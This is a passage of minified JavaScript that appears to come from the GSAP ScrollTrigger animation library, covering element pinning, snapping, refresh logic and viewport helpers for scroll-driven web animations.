          t._isFlipped = n, r[i.a + "Percent"] = n ? -100 : 0, r[i.a] = n ? "1px" : 0, r["border" + s + Ut] = 1, r["border" + o + Ut] = 0, r[i.p] = e + "px", F.set(t, r)
        },
        ue = [],
        fe = {},
        de = function () {
          return bt() - xt > 34 && (mt || (mt = requestAnimationFrame(Ae)))
        },
        pe = function () {
          (!at || !at.isPressed || at.startX > V.clientWidth) && (y.cache++, at ? mt || (mt = requestAnimationFrame(Ae)) : Ae(), xt || be("scrollStart"), xt = bt())
        },
        me = function () {
          ht = H.innerWidth, ct = H.innerHeight
        },
        ve = function () {
          y.cache++, !Q && !ot && !j.fullscreenElement && !j.webkitFullscreenElement && (!lt || ht !== H.innerWidth || Math.abs(H.innerHeight - ct) > .25 * H.innerHeight) && q.restart(!0)
        },
        ge = {},
        ye = [],
        _e = function t() {
          return ne(He, "scrollEnd", t) || Ee(!0)
        },
        be = function (t) {
          return ge[t] && ge[t].map((function (t) {
            return t()
          })) || ye
        },
        we = [],
        xe = function (t) {
          for (var e = 0; e < we.length; e += 5)(!t || we[e + 4] && we[e + 4].query === t) && (we[e].style.cssText = we[e + 1], we[e].getBBox && we[e].setAttribute("transform", we[e + 2] || ""), we[e + 3].uncache = 1)
        },
        Te = function (t, e) {
          var i;
          for (tt = 0; tt < ue.length; tt++) !(i = ue[tt]) || e && i._ctx !== e || (t ? i.kill(1) : i.revert(!0, !0));
          e && xe(e), e || be("revert")
        },
        Se = function (t, e) {
          y.cache++, (e || !vt) && y.forEach((function (t) {
            return Bt(t) && t.cacheID++ && (t.rec = 0)
          })), Rt(t) && (H.history.scrollRestoration = dt = t)
        },
        ke = 0,
        Ee = function (t, e) {
          if (!xt || t) {
            vt = He.isRefreshing = !0, y.forEach((function (t) {
              return Bt(t) && t.cacheID++ && (t.rec = t())
            }));
            var i = be("refreshInit");
            rt && He.sort(), e || Te(), y.forEach((function (t) {
              Bt(t) && (t.smooth && (t.target.style.scrollBehavior = "auto"), t(0))
            })), ue.slice(0).forEach((function (t) {
              return t.refresh()
            })), ue.forEach((function (t, e) {
              if (t._subPinOffset && t.pin) {
                var i = t.vars.horizontal ? "offsetWidth" : "offsetHeight",
                  n = t.pin[i];
                t.revert(!0, 1), t.adjustPinSpacing(t.pin[i] - n), t.revert(!1, 1)
              }
            })), ue.forEach((function (t) {
              return "max" === t.vars.end && t.setPositions(t.start, Math.max(t.start + 1, Pt(t.scroller, t._dir)))
            })), i.forEach((function (t) {
              return t && t.render && t.render(-1)
            })), y.forEach((function (t) {
              Bt(t) && (t.smooth && requestAnimationFrame((function () {
                return t.target.style.scrollBehavior = "smooth"
              })), t.rec && t(t.rec))
            })), Se(dt, 1), q.pause(), ke++, Ae(2), ue.forEach((function (t) {
              return Bt(t.vars.onRefresh) && t.vars.onRefresh(t)
            })), vt = He.isRefreshing = !1, be("refresh")
          } else ie(He, "scrollEnd", _e)
        },
        Me = 0,
        Oe = 1,
        Ae = function (t) {
          if (!vt || 2 === t) {
            He.isUpdating = !0, yt && yt.update(0);
            var e = ue.length,
              i = bt(),
              n = i - wt >= 50,
              r = e && ue[0].scroll();
            if (Oe = Me > r ? -1 : 1, Me = r, n && (xt && !$ && i - xt > 200 && (xt = 0, be("scrollEnd")), K = wt, wt = i), Oe < 0) {
              for (tt = e; tt-- > 0;) ue[tt] && ue[tt].update(0, n);
              Oe = 1
            } else
              for (tt = 0; tt < e; tt++) ue[tt] && ue[tt].update(0, n);
            He.isUpdating = !1
          }
          mt = 0
        },
        Ce = ["left", "top", jt, Ht, "marginBottom", "marginRight", "marginTop", "marginLeft", "display", "flexShrink", "float", "zIndex", "gridColumnStart", "gridColumnEnd", "gridRowStart", "gridRowEnd", "gridArea", "justifySelf", "alignSelf", "placeSelf", "order"],
        De = Ce.concat([Wt, Vt, "boxSizing", "maxWidth", "maxHeight", "position", qt, Nt, "paddingTop", "paddingRight", "paddingBottom", "paddingLeft"]),
        Pe = function (t, e, i, n) {
          if (!t._gsap.swappedIn) {
            for (var r, s = Ce.length, o = e.style, a = t.style; s--;) o[r = Ce[s]] = i[r];
            o.position = "absolute" === i.position ? "absolute" : "relative", "inline" === i.display && (o.display = "inline-block"), a.bottom = a.right = "auto", o.flexBasis = i.flexBasis || "auto", o.overflow = "visible", o.boxSizing = "border-box", o.width = $t(t, O) + Gt, o.height = $t(t, A) + Gt, o.padding = a.margin = a.top = a.left = "0", Re(n), a.width = a.maxWidth = i.width, a.height = a.maxHeight = i.height, a.padding = i.padding, t.parentNode !== e && (t.parentNode.insertBefore(e, t), e.appendChild(t)), t._gsap.swappedIn = !0
          }
        },
        Le = /([A-Z])/g,
        Re = function (t) {
          if (t) {
            var e, i, n = t.t.style,
              r = t.length,
              s = 0;
            for ((t.t._gsap || F.core.getCache(t.t)).uncache = 1; s < r; s += 2) i = t[s + 1], e = t[s], i ? n[e] = i : n[e] && n.removeProperty(e.replace(Le, "-$1").toLowerCase())
          }
        },
        Be = function (t) {
          for (var e = De.length, i = t.style, n = [], r = 0; r < e; r++) n.push(De[r], i[De[r]]);
          return n.t = t, n
        },
        Ie = {
          left: 0,
          top: 0
        },
        ze = function (t, e, i, n, r, s, o, a, l, c, h, u, f) {
          Bt(t) && (t = t(a)), Rt(t) && "max" === t.substr(0, 3) && (t = u + ("=" === t.charAt(4) ? le("0" + t.substr(3), i) : 0));
          var d, p, m, v = f ? f.time() : 0;
          if (f && f.seek(0), It(t)) o && he(o, i, n, !0);
          else {
            Bt(e) && (e = e(a));
            var g, y, _, b, w = (t || "0").split(" ");
            m = C(e) || V, (g = Qt(m) || {}) && (g.left || g.top) || "none" !== Kt(m).display || (b = m.style.display, m.style.display = "block", g = Qt(m), b ? m.style.display = b : m.style.removeProperty("display")), y = le(w[0], g[n.d]), _ = le(w[1] || "0", i), t = g[n.p] - l[n.p] - c + y + r - _, o && he(o, _, n, i - _ < 20 || o._isStart && _ > 20), i -= i - _
          }
          if (s) {
            var x = t + i,
              T = s._isStart;
            d = "scroll" + n.d2, he(s, x, n, T && x > 20 || !T && (h ? Math.max(V[d], W[d]) : s.parentNode[d]) <= x + 1), h && (l = Qt(o), h && (s.style[n.op.p] = l[n.op.p] - n.op.m - s._offset + Gt))
          }
          return f && m && (d = Qt(m), f.seek(u), p = Qt(m), f._caScrollDist = d[n.p] - p[n.p], t = t / f._caScrollDist * u), f && f.seek(v), f ? t : Math.round(t)
        },
        Ye = /(webkit|moz|length|cssText|inset)/i,
        Fe = function (t, e, i, n) {
          if (t.parentNode !== e) {
            var r, s, o = t.style;
            if (e === V) {
              for (r in t._stOrig = o.cssText, s = Kt(t)) + r || Ye.test(r) || !s[r] || "string" != typeof o[r] || "0" === r || (o[r] = s[r]);
              o.top = i, o.left = n
            } else o.cssText = t._stOrig;
            F.core.getCache(t).uncache = 1, e.appendChild(t)
          }
        },
        Xe = function (t, e) {
          var i, n, r = D(t, e),
            s = "_scroll" + e.p2,
            o = function e(o, a, l, c, h) {
              var u = e.tween,
                f = a.onComplete,
                d = {};
              return l = l || r(), h = c && h || 0, c = c || o - l, u && u.kill(), i = Math.round(l), a[s] = o, a.modifiers = d, d[s] = function (t) {
                return (t = Math.round(r())) !== i && t !== n && Math.abs(t - i) > 3 && Math.abs(t - n) > 3 ? (u.kill(), e.tween = 0) : t = l + c * u.ratio + h * u.ratio * u.ratio, n = i, i = Math.round(t)
              }, a.onComplete = function () {
                e.tween = 0, f && f.call(u)
              }, u = e.tween = F.to(t, a)
            };
          return t[s] = r, r.wheelHandler = function () {
            return o.tween && o.tween.kill() && (o.tween = 0)
          }, ie(t, "wheel", r.wheelHandler), o
        },
        He = function () {
          function t(e, i) {
            X || t.register(F) || console.warn("Please gsap.registerPlugin(ScrollTrigger)"), this.init(e, i)
          }
          return t.prototype.init = function (e, i) {
            if (this.progress = this.start = 0, this.vars && this.kill(!0, !0), Tt) {
              var n, r, s, o, a, l, c, h, u, f, d, p, m, v, g, b, w, T, S, k, E, M, P, L, R, B, I, z, Y, X, N, q, Z, J, et, it, nt, ot, at, lt, ct, ht = e = Zt(Rt(e) || It(e) || e.nodeType ? {
                  trigger: e
                } : e, oe),
                ut = ht.onUpdate,
                dt = ht.toggleClass,
                mt = ht.id,
                wt = ht.onToggle,
                St = ht.onRefresh,
                kt = ht.scrub,
                Ot = ht.trigger,
                At = ht.pin,
                Lt = ht.pinSpacing,
                Ht = ht.invalidateOnRefresh,
                jt = ht.anticipatePin,
                Wt = ht.onScrubComplete,
                Vt = ht.onSnapComplete,
                ee = ht.once,
                re = ht.snap,
                ae = ht.pinReparent,
                he = ht.pinSpacer,
                de = ht.containerAnimation,
                me = ht.fastScrollEnd,
                ge = ht.preventOverlaps,
                ye = e.horizontal || e.containerAnimation && !1 !== e.horizontal ? O : A,
                be = !kt && 0 !== kt,
                we = C(e.scroller || H),
                xe = F.core.getCache(we),
                Te = Ct(we),
                Se = "fixed" === ("pinType" in e ? e.pinType : x(we, "pinType") || Te && "fixed"),
                Me = [e.onEnter, e.onLeave, e.onEnterBack, e.onLeaveBack],
                Ae = be && e.toggleActions.split(" "),
                Ce = "markers" in e ? e.markers : oe.markers,
                De = Te ? 0 : parseFloat(Kt(we)["border" + ye.p2 + Ut]) || 0,
                Le = this,
                Ye = e.onRefreshInit && function () {
                  return e.onRefreshInit(Le)
                },
                He = function (t, e, i) {
                  var n = i.d,
                    r = i.d2,
                    s = i.a;
                  return (s = x(t, "getBoundingClientRect")) ? function () {
                    return s()[n]
                  } : function () {
                    return (e ? H["inner" + r] : t["client" + r]) || 0
                  }
                }(we, Te, ye),
                je = function (t, e) {
                  return !e || ~_.indexOf(t) ? Dt(t) : function () {
                    return Ie
                  }
                }(we, Te),
                We = 0,
                Ve = 0,
                Ne = D(we, ye);
              if (ft(Le), Le._dir = ye, jt *= 45, Le.scroller = we, Le.scroll = de ? de.time.bind(de) : Ne, o = Ne(), Le.vars = e, i = i || e.animation, "refreshPriority" in e && (rt = 1, -9999 === e.refreshPriority && (yt = Le)), xe.tweenScroll = xe.tweenScroll || {
                  top: Xe(we, A),
                  left: Xe(we, O)
                }, Le.tweenTo = n = xe.tweenScroll[ye.p], Le.scrubDuration = function (t) {
                  (N = It(t) && t) ? X ? X.duration(t) : X = F.to(i, {
                    ease: "expo",
                    totalProgress: "+=0.001",
                    duration: N,
                    paused: !0,
                    onComplete: function () {
                      return Wt && Wt(Le)
                    }
                  }): (X && X.progress(1).kill(), X = 0)
                }, i && (i.vars.lazy = !1, i._initted || !1 !== i.vars.immediateRender && !1 !== e.immediateRender && i.duration() && i.render(0, !0, !0), Le.animation = i.pause(), i.scrollTrigger = Le, Le.scrubDuration(kt), z = 0, mt || (mt = i.vars.id)), ue.push(Le), re && (zt(re) && !re.push || (re = {
                  snapTo: re
                }), "scrollBehavior" in V.style && F.set(Te ? [V, W] : we, {
                  scrollBehavior: "auto"
                }), y.forEach((function (t) {
                  return Bt(t) && t.target === (Te ? j.scrollingElement || W : we) && (t.smooth = !1)
                })), s = Bt(re.snapTo) ? re.snapTo : "labels" === re.snapTo ? function (t) {
                  return function (e) {
                    return F.utils.snap(Jt(t), e)
                  }
                }(i) : "labelsDirectional" === re.snapTo ? (at = i, function (t, e) {
                  return te(Jt(at))(t, e.direction)
                }) : !1 !== re.directional ? function (t, e) {
                  return te(re.snapTo)(t, bt() - Ve < 500 ? 0 : e.direction)
                } : F.utils.snap(re.snapTo), q = re.duration || {
                  min: .1,
                  max: 2
                }, q = zt(q) ? G(q.min, q.max) : G(q, q), Z = F.delayedCall(re.delay || N / 2 || .1, (function () {
                  var t = Ne(),
                    e = bt() - Ve < 500,
                    r = n.tween;
                  if (!(e || Math.abs(Le.getVelocity()) < 10) || r || $ || We === t) Le.isActive && We !== t && Z.restart(!0);
                  else {
                    var o = (t - l) / m,
                      a = i && !be ? i.totalProgress() : o,
                      h = e ? 0 : (a - Y) / (bt() - K) * 1e3 || 0,
                      u = F.utils.clamp(-o, 1 - o, Xt(h / 2) * h / .185),
                      f = o + (!1 === re.inertia ? 0 : u),
                      d = G(0, 1, s(f, Le)),
                      p = Math.round(l + d * m),
                      v = re,
                      g = v.onStart,
                      y = v.onInterrupt,
                      _ = v.onComplete;
                    if (t <= c && t >= l && p !== t) {
                      if (r && !r._initted && r.data <= Xt(p - t)) return;
                      !1 === re.inertia && (u = d - o), n(p, {
                        duration: q(Xt(.185 * Math.max(Xt(f - a), Xt(d - a)) / h / .05 || 0)),
                        ease: re.ease || "power3",
                        data: Xt(p - t),
                        onInterrupt: function () {
                          return Z.restart(!0) && y && y(Le)
                        },
                        onComplete: function () {
                          Le.update(), We = Ne(), z = Y = i && !be ? i.totalProgress() : Le.progress, Vt && Vt(Le), _ && _(Le)
                        }
                      }, t, u * m, p - t - u * m), g && g(Le, n.tween)
                    }
                  }
                })).pause()), mt && (fe[mt] = Le), (ot = (Ot = Le.trigger = C(Ot || At)) && Ot._gsap && Ot._gsap.stRevert) && (ot = ot(Le)), At = !0 === At ? Ot : C(At), Rt(dt) && (dt = {
                  targets: Ot,
                  className: dt
                }), At && (!1 === Lt || Lt === qt || (Lt = !(!Lt && At.parentNode && At.parentNode.style && "flex" === Kt(At.parentNode).display) && Nt), Le.pin = At, (r = F.core.getCache(At)).spacer ? v = r.pinState : (he && ((he = C(he)) && !he.nodeType && (he = he.current || he.nativeElement), r.spacerIsNative = !!he, he && (r.spacerState = Be(he))), r.spacer = w = he || j.createElement("div"), w.classList.add("pin-spacer"), mt && w.classList.add("pin-spacer-" + mt), r.pinState = v = Be(At)), !1 !== e.force3D && F.set(At, {
                  force3D: !0
                }), Le.spacer = w = r.spacer, I = Kt(At), P = I[Lt + ye.os2], S = F.getProperty(At), k = F.quickSetter(At, ye.a, Gt), Pe(At, w, I), b = Be(At)), Ce) {
                p = zt(Ce) ? Zt(Ce, se) : se, f = ce("scroller-start", mt, we, ye, p, 0), d = ce("scroller-end", mt, we, ye, p, 0, f), T = f["offset" + ye.op.d2];
                var qe = C(x(we, "content") || we);
                h = this.markerStart = ce("start", mt, qe, ye, p, T, 0, de), u = this.markerEnd = ce("end", mt, qe, ye, p, T, 0, de), de && (nt = F.quickSetter([h, u], ye.a, Gt)), Se || _.length && !0 === x(we, "fixedMarkers") || (ct = Kt(lt = Te ? V : we).position, lt.style.position = "absolute" === ct || "fixed" === ct ? ct : "relative", F.set([f, d], {
                  force3D: !0
                }), R = F.quickSetter(f, ye.a, Gt), B = F.quickSetter(d, ye.a, Gt))
              }
              if (de) {
                var Ue = de.vars.onUpdate,
                  Ge = de.vars.onUpdateParams;
                de.eventCallback("onUpdate", (function () {
                  Le.update(0, 0, 1), Ue && Ue.apply(Ge || [])
                }))
              }
              Le.previous = function () {
                return ue[ue.indexOf(Le) - 1]
              }, Le.next = function () {
                return ue[ue.indexOf(Le) + 1]
              }, Le.revert = function (t, e) {
                if (!e) return Le.kill(!0);
                var n = !1 !== t || !Le.enabled,
                  r = Q;
                n !== Le.isReverted && (n && (et = Math.max(Ne(), Le.scroll.rec || 0), J = Le.progress, it = i && i.progress()), h && [h, u, f, d].forEach((function (t) {
                  return t.style.display = n ? "none" : "block"
                })), n && (Q = 1, Le.update(n)), At && (n ? function (t, e, i) {
                  Re(i);
                  var n = t._gsap;
                  if (n.spacerIsNative) Re(n.spacerState);
                  else if (t._gsap.swappedIn) {
                    var r = e.parentNode;
                    r && (r.insertBefore(t, e), r.removeChild(e))
                  }
                  t._gsap.swappedIn = !1
                }(At, w, v) : (!ae || !Le.isActive) && Pe(At, w, Kt(At), L)), n || Le.update(n), Q = r, Le.isReverted = n)
              }, Le.refresh = function (r, s) {
                if (!Q && Le.enabled || s)
                  if (At && r && xt) ie(t, "scrollEnd", _e);
                  else {
                    !vt && Ye && Ye(Le), Q = 1, Ve = bt(), n.tween && (n.tween.kill(), n.tween = 0), X && X.pause(), Ht && i && i.revert({
                      kill: !1
                    }).invalidate(), Le.isReverted || Le.revert(!0, !0), Le._subPinOffset = !1;
                    for (var p, y, _, x, T, k, P, R, B, I, z = He(), Y = je(), H = de ? de.duration() : Pt(we, ye), j = 0, W = 0, N = e.end, q = e.endTrigger || Ot, U = e.start || (0 !== e.start && Ot ? At ? "0 0" : "0 100%" : 0), G = Le.pinnedContainer = e.pinnedContainer && C(e.pinnedContainer), K = Ot && Math.max(0, ue.indexOf(Le)) || 0, $ = K; $--;)(k = ue[$]).end || k.refresh(0, 1) || (Q = 1), !(P = k.pin) || P !== Ot && P !== At || k.isReverted || (I || (I = []), I.unshift(k), k.revert(!0, !0)), k !== ue[$] && (K--, $--);
                    for (Bt(U) && (U = U(Le)), l = ze(U, Ot, z, ye, Ne(), h, f, Le, Y, De, Se, H, de) || (At ? -.001 : 0), Bt(N) && (N = N(Le)), Rt(N) && !N.indexOf("+=") && (~N.indexOf(" ") ? N = (Rt(U) ? U.split(" ")[0] : "") + N : (j = le(N.substr(2), z), N = Rt(U) ? U : l + j, q = Ot)), c = Math.max(l, ze(N || (q ? "100% 0" : H), q, z, ye, Ne() + j, u, d, Le, Y, De, Se, H, de)) || -.001, m = c - l || (l -= .01) && .001, j = 0, $ = K; $--;)(P = (k = ue[$]).pin) && k.start - k._pinPush <= l && !de && k.end > 0 && (p = k.end - k.start, (P === Ot && k.start - k._pinPush < l || P === G) && !It(U) && (j += p * (1 - k.progress)), P === At && (W += p));
                    if (l += j, c += j, Le._pinPush = W, h && j && ((p = {})[ye.a] = "+=" + j, G && (p[ye.p] = "-=" + Ne()), F.set([h, u], p)), At) p = Kt(At), x = ye === A, _ = Ne(), E = parseFloat(S(ye.a)) + W, !H && c > 1 && ((Te ? V : we).style["overflow-" + ye.a] = "scroll"), Pe(At, w, p), b = Be(At), y = Qt(At, !0), R = Se && D(we, x ? O : A)(), Lt && ((L = [Lt + ye.os2, m + W + Gt]).t = w, ($ = Lt === Nt ? $t(At, ye) + m + W : 0) && L.push(ye.d, $ + Gt), Re(L), G && ue.forEach((function (t) {
                      t.pin === G && !1 !== t.vars.pinSpacing && (t._subPinOffset = !0)
                    })), Se && Ne(et)), Se && ((T = {
                      top: y.top + (x ? _ - l : R) + Gt,
                      left: y.left + (x ? R : _ - l) + Gt,
                      boxSizing: "border-box",
                      position: "fixed"
                    }).width = T.maxWidth = Math.ceil(y.width) + Gt, T.height = T.maxHeight = Math.ceil(y.height) + Gt, T.margin = T.marginTop = T.marginRight = T.marginBottom = T.marginLeft = "0", T.padding = p.padding, T.paddingTop = p.paddingTop, T.paddingRight = p.paddingRight, T.paddingBottom = p.paddingBottom, T.paddingLeft = p.paddingLeft, g = function (t, e, i) {
                      for (var n, r = [], s = t.length, o = i ? 8 : 0; o < s; o += 2) n = t[o], r.push(n, n in e ? e[n] : t[o + 1]);
                      return r.t = t.t, r
                    }(v, T, ae), vt && Ne(0)), i ? (B = i._initted, st(1), i.render(i.duration(), !0, !0), M = S(ye.a) - E + m + W, m !== M && Se && g.splice(g.length - 2, 2), i.render(0, !0, !0), B || i.invalidate(!0), i.parent || i.totalTime(i.totalTime()), st(0)) : M = m;
                    else if (Ot && Ne() && !de)
                      for (y = Ot.parentNode; y && y !== V;) y._pinOffset && (l -= y._pinOffset, c -= y._pinOffset), y = y.parentNode;
                    I && I.forEach((function (t) {
                      return t.revert(!1, !0)
                    })), Le.start = l, Le.end = c, o = a = vt ? et : Ne(), de || vt || (o < et && Ne(et), Le.scroll.rec = 0), Le.revert(!1, !0), Z && (We = -1, Le.isActive && Ne(l + m * J), Z.restart(!0)), Q = 0, i && be && (i._initted || it) && i.progress() !== it && i.progress(it, !0).render(i.time(), !0, !0), (J !== Le.progress || de) && (i && !be && i.totalProgress(J, !0), Le.progress = (o - l) / m === J ? 0 : J), At && Lt && (w._pinOffset = Math.round(Le.progress * M)), St && !vt && St(Le)
                  }
              }, Le.getVelocity = function () {
                return (Ne() - a) / (bt() - K) * 1e3 || 0
              }, Le.endAnimation = function () {
                Yt(Le.callbackAnimation), i && (X ? X.progress(1) : i.paused() ? be || Yt(i, Le.direction < 0, 1) : Yt(i, i.reversed()))
              }, Le.labelToScroll = function (t) {
                return i && i.labels && (l || Le.refresh() || l) + i.labels[t] / i.duration() * m || 0
              }, Le.getTrailing = function (t) {
                var e = ue.indexOf(Le),
                  i = Le.direction > 0 ? ue.slice(0, e).reverse() : ue.slice(e + 1);
                return (Rt(t) ? i.filter((function (e) {
                  return e.vars.preventOverlaps === t
                })) : i).filter((function (t) {
                  return Le.direction > 0 ? t.end <= l : t.start >= c
                }))
              }, Le.update = function (t, e, r) {
                if (!de || r || t) {
                  var s, h, u, d, p, v, y, _ = vt ? et : Le.scroll(),
                    x = t ? 0 : (_ - l) / m,
                    T = x < 0 ? 0 : x > 1 ? 1 : x || 0,
                    S = Le.progress;
                  if (e && (a = o, o = de ? Ne() : _, re && (Y = z, z = i && !be ? i.totalProgress() : T)), jt && !T && At && !Q && !_t && xt && l < _ + (_ - a) / (bt() - K) * jt && (T = 1e-4), T !== S && Le.enabled) {
                    if (d = (p = (s = Le.isActive = !!T && T < 1) != (!!S && S < 1)) || !!T != !!S, Le.direction = T > S ? 1 : -1, Le.progress = T, d && !Q && (h = T && !S ? 0 : 1 === T ? 1 : 1 === S ? 2 : 3, be && (u = !p && "none" !== Ae[h + 1] && Ae[h + 1] || Ae[h], y = i && ("complete" === u || "reset" === u || u in i))), ge && (p || y) && (y || kt || !i) && (Bt(ge) ? ge(Le) : Le.getTrailing(ge).forEach((function (t) {
                        return t.endAnimation()
                      }))), be || (!X || Q || _t ? i && i.totalProgress(T, !!Q) : ((de || yt && yt !== Le) && X.render(X._dp._time - X._start), X.resetTo ? X.resetTo("totalProgress", T, i._tTime / i._tDur) : (X.vars.totalProgress = T, X.invalidate().restart()))), At)
                      if (t && Lt && (w.style[Lt + ye.os2] = P), Se) {
                        if (d) {
                          if (v = !t && T > S && c + 1 > _ && _ + 1 >= Pt(we, ye), ae)
                            if (t || !s && !v) Fe(At, w);
                            else {
                              var O = Qt(At, !0),
                                C = _ - l;
                              Fe(At, V, O.top + (ye === A ? C : 0) + Gt, O.left + (ye === A ? 0 : C) + Gt)
                            } Re(s || v ? g : b), M !== m && T < 1 && s || k(E + (1 !== T || v ? 0 : M))
                        }
                      } else k(Mt(E + M * T));
                    re && !n.tween && !Q && !_t && Z.restart(!0), dt && (p || ee && T && (T < 1 || !pt)) && U(dt.targets).forEach((function (t) {
                      return t.classList[s || ee ? "add" : "remove"](dt.className)
                    })), ut && !be && !t && ut(Le), d && !Q ? (be && (y && ("complete" === u ? i.pause().totalProgress(1) : "reset" === u ? i.restart(!0).pause() : "restart" === u ? i.restart(!0) : i[u]()), ut && ut(Le)), !p && pt || (wt && p && Ft(Le, wt), Me[h] && Ft(Le, Me[h]), ee && (1 === T ? Le.kill(!1, 1) : Me[h] = 0), p || Me[h = 1 === T ? 1 : 3] && Ft(Le, Me[h])), me && !s && Math.abs(Le.getVelocity()) > (It(me) ? me : 2500) && (Yt(Le.callbackAnimation), X ? X.progress(1) : Yt(i, "reverse" === u ? 1 : !T, 1))) : be && ut && !Q && ut(Le)
                  }
                  if (B) {
                    var D = de ? _ / de.duration() * (de._caScrollDist || 0) : _;
                    R(D + (f._isFlipped ? 1 : 0)), B(D)
                  }
                  nt && nt(-_ / de.duration() * (de._caScrollDist || 0))
                }
              }, Le.enable = function (e, i) {
                Le.enabled || (Le.enabled = !0, ie(we, "resize", ve), ie(Te ? j : we, "scroll", pe), Ye && ie(t, "refreshInit", Ye), !1 !== e && (Le.progress = J = 0, o = a = We = Ne()), !1 !== i && Le.refresh())
              }, Le.getTween = function (t) {
                return t && n ? n.tween : X
              }, Le.setPositions = function (t, e) {
                At && (E += t - l, M += e - t - m, Lt === Nt && Le.adjustPinSpacing(e - t - m)), Le.start = l = t, Le.end = c = e, m = e - t, Le.update()
              }, Le.adjustPinSpacing = function (t) {
                if (L) {
                  var e = L.indexOf(ye.d) + 1;
                  L[e] = parseFloat(L[e]) + t + Gt, L[1] = parseFloat(L[1]) + t + Gt, Re(L)
                }
              }, Le.disable = function (e, i) {
                if (Le.enabled && (!1 !== e && Le.revert(!0, !0), Le.enabled = Le.isActive = !1, i || X && X.pause(), et = 0, r && (r.uncache = 1), Ye && ne(t, "refreshInit", Ye), Z && (Z.pause(), n.tween && n.tween.kill() && (n.tween = 0)), !Te)) {
                  for (var s = ue.length; s--;)
                    if (ue[s].scroller === we && ue[s] !== Le) return;
                  ne(we, "resize", ve), ne(we, "scroll", pe)
                }
              }, Le.kill = function (t, n) {
                Le.disable(t, n), X && !n && X.kill(), mt && delete fe[mt];
                var s = ue.indexOf(Le);
                s >= 0 && ue.splice(s, 1), s === tt && Oe > 0 && tt--, s = 0, ue.forEach((function (t) {
                  return t.scroller === Le.scroller && (s = 1)
                })), s || vt || (Le.scroll.rec = 0), i && (i.scrollTrigger = null, t && i.revert({
                  kill: !1
                }), n || i.kill()), h && [h, u, f, d].forEach((function (t) {
                  return t.parentNode && t.parentNode.removeChild(t)
                })), yt === Le && (yt = 0), At && (r && (r.uncache = 1), s = 0, ue.forEach((function (t) {
                  return t.pin === At && s++
                })), s || (r.spacer = 0)), e.onKill && e.onKill(Le)
              }, Le.enable(!1, !1), ot && ot(Le), i && i.add && !m ? F.delayedCall(.01, (function () {
                return l || c || Le.refresh()
              })) && (m = .01) && (l = c = 0) : Le.refresh(), At && function () {
                if (gt !== ke) {
                  var t = gt = ke;
                  requestAnimationFrame((function () {
                    return t === ke && Ee(!0)
                  }))
                }
              }()
            } else this.update = this.refresh = this.kill = Et
          }, t.register = function (e) {
            return X || (F = e || At(), Ot() && window.document && t.enable(), X = Tt), X
          }, t.defaults = function (t) {
            if (t)
              for (var e in t) oe[e] = t[e];
            return oe
          }, t.disable = function (t, e) {
            Tt = 0, ue.forEach((function (i) {
              return i[e ? "kill" : "disable"](t)
            })), ne(H, "wheel", pe), ne(j, "scroll", pe), clearInterval(Z), ne(j, "touchcancel", Et), ne(V, "touchstart", Et), ee(ne, j, "pointerdown,touchstart,mousedown", St), ee(ne, j, "pointerup,touchend,mouseup", kt), q.kill(), Lt(ne);
            for (var i = 0; i < y.length; i += 3) re(ne, y[i], y[i + 1]), re(ne, y[i], y[i + 2])
          }, t.enable = function () {
            if (H = window, j = document, W = j.documentElement, V = j.body, F && (U = F.utils.toArray, G = F.utils.clamp, ft = F.core.context || Et, st = F.core.suppressOverwrites || Et, dt = H.history.scrollRestoration || "auto", F.core.globals("ScrollTrigger", t), V)) {
              Tt = 1, z.register(F), t.isTouch = z.isTouch, ut = z.isTouch && /(iPad|iPhone|iPod|Mac)/g.test(navigator.userAgent), ie(H, "wheel", pe), N = [H, j, W, V], F.matchMedia ? (t.matchMedia = function (t) {
                var e, i = F.matchMedia();
                for (e in t) i.add(e, t[e]);
                return i
              }, F.addEventListener("matchMediaInit", (function () {
                return Te()
              })), F.addEventListener("matchMediaRevert", (function () {
                return xe()
              })), F.addEventListener("matchMedia", (function () {
                Ee(0, 1), be("matchMedia")
              })), F.matchMedia("(orientation: portrait)", (function () {
                return me(), me
              }))) : console.warn("Requires GSAP 3.11.0 or later"), me(), ie(j, "scroll", pe);
              var e, i, n = V.style,
                r = n.borderTopStyle,
                s = F.core.Animation.prototype;
              for (s.revert || Object.defineProperty(s, "revert", {
                  value: function () {
                    return this.time(-.01, !0)
                  }
                }), n.borderTopStyle = "solid", e = Qt(V), A.m = Math.round(e.top + A.sc()) || 0, O.m = Math.round(e.left + O.sc()) || 0, r ? n.borderTopStyle = r : n.removeProperty("border-top-style"), Z = setInterval(de, 250), F.delayedCall(.5, (function () {
                  return _t = 0
                })), ie(j, "touchcancel", Et), ie(V, "touchstart", Et), ee(ie, j, "pointerdown,touchstart,mousedown", St), ee(ie, j, "pointerup,touchend,mouseup", kt), J = F.utils.checkPrefix("transform"), De.push(J), X = bt(), q = F.delayedCall(.2, Ee).pause(), nt = [j, "visibilitychange", function () {
                  var t = H.innerWidth,
                    e = H.innerHeight;
                  j.hidden ? (et = t, it = e) : et === t && it === e || ve()
                }, j, "DOMContentLoaded", Ee, H, "load", Ee, H, "resize", ve], Lt(ie), ue.forEach((function (t) {
                  return t.enable(0, 1)
                })), i = 0; i < y.length; i += 3) re(ne, y[i], y[i + 1]), re(ne, y[i], y[i + 2])
            }
          }, t.config = function (e) {
            "limitCallbacks" in e && (pt = !!e.limitCallbacks);
            var i = e.syncInterval;
            i && clearInterval(Z) || (Z = i) && setInterval(de, i), "ignoreMobileResize" in e && (lt = 1 === t.isTouch && e.ignoreMobileResize), "autoRefreshEvents" in e && (Lt(ne) || Lt(ie, e.autoRefreshEvents || "none"), ot = -1 === (e.autoRefreshEvents + "").indexOf("resize"))
          }, t.scrollerProxy = function (t, e) {
            var i = C(t),
              n = y.indexOf(i),
              r = Ct(i);
            ~n && y.splice(n, r ? 6 : 2), e && (r ? _.unshift(H, e, V, e, W, e) : _.unshift(i, e))
          }, t.clearMatchMedia = function (t) {
            ue.forEach((function (e) {
              return e._ctx && e._ctx.query === t && e._ctx.kill(!0, !0)
            }))
          }, t.isInViewport = function (t, e, i) {
            var n = (Rt(t) ? C(t) : t).getBoundingClientRect(),
              r = n[i ? Wt : Vt] * e || 0;
            return i ? n.right - r > 0 && n.left + r < H.innerWidth : n.bottom - r > 0 && n.top + r < H.innerHeight
          }, t.positionInViewport = function (t, e, i) {
            Rt(t) && (t = C(t));
            var n = t.getBoundingClientRect(),
              r = n[i ? Wt : Vt],
              s = null == e ? r / 2 : e in ae ? ae[e] * r : ~e.indexOf("%") ? parseFloat(e) * r / 100 : parseFloat(e) || 0;
            return i ? (n.left + s) / H.innerWidth : (n.top + s) / H.innerHeight
          }, t.killAll = function (t) {
